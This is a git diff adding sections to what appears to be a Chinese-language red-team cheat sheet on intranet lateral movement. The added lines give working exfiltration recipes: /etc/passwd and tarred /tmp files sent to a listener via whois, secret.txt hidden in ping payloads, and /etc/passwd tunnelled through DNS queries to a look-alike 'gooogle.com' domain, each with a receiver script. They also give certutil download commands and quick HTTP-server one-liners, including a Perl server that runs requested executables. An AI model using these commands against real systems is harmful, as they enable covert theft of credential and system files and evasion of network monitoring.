@@ -33,6 +33,7 @@ Table of Contents
     * [代理脚本](#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC)
   * [shell反弹](#shell%E5%8F%8D%E5%BC%B9)
   * [内网文件的传输和下载](#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD)
+  * [搭建 HTTP server](#%E6%90%AD%E5%BB%BA%20HTTP%20server)
 * [内网信息搜集](#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)
   * [本机信息搜集](#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)
     * [1、用户列表](#1%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8)
@@ -523,7 +524,122 @@ certutil.exe
 ```
 certutil.exe -urlcache -split -f http://site.com/file
 ```
+copy
+```
+copy \\IP\ShareName\file.exe file.exe
+```
+WHOIS
+接收端 Host B：
+```
+nc -vlnp 1337 | sed "s/ //g" | base64 -d 
+```
+发送端 Host A：
+```
+whois -h host_ip -p 1337 `cat /etc/passwd | base64`
+```
+
+[WHOIS + TAR](https://twitter.com/mubix/status/1102780436118409216)
+First:  
+```
+ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
+```
+
+Next
+```
+tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
+```
+
+Finally
+```
+cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
+```
+
+PING
+发送端:
+```
+xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
+```
+接收端`ping_receiver.py`:
+```
+import sys
+
+try:
+    from scapy.all import *
+except:
+    print("Scapy not found, please install scapy: pip install scapy")
+    sys.exit(0)
+
+
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type == 8:
+            data = pkt[ICMP].load[-4:]
+            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")
+
+sniff(iface="eth0", prn=process_packet)
+```
+```
+python3 ping_receiver.py
+```
+
+DIG
+发送端:
+```
+xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
+```
+接收端`dns_reciver.py`:
+```
+try:
+    from scapy.all import *
+except:
+    print("Scapy not found, please install scapy: pip install scapy")
+
+def process_packet(pkt):
+    if pkt.haslayer(DNS):
+        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
+        root_domain = domain.split('.')[1]
+        if root_domain.startswith('gooogle'):
+            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')
+
+sniff(iface="eth0", prn=process_packet)
+```
+```
+python3 dns_reciver.py
+```
 ... 
+### 搭建 HTTP server
+python2
+```
+python -m SimpleHTTPServer 1337
+```
+python3
+```
+python -m http.server 1337
+```
+PHP 5.4+
+```
+php -S 0.0.0.0:1337
+```
+ruby
+```
+ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
+```
+```
+ruby -run -e httpd . -p 1337
+```
+Perl
+```
+perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
+```
+```
+perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
+```
+busybox httpd
+```
+busybox httpd -f -p 8000
+```
+
+
 
 ## 内网信息搜集 
 
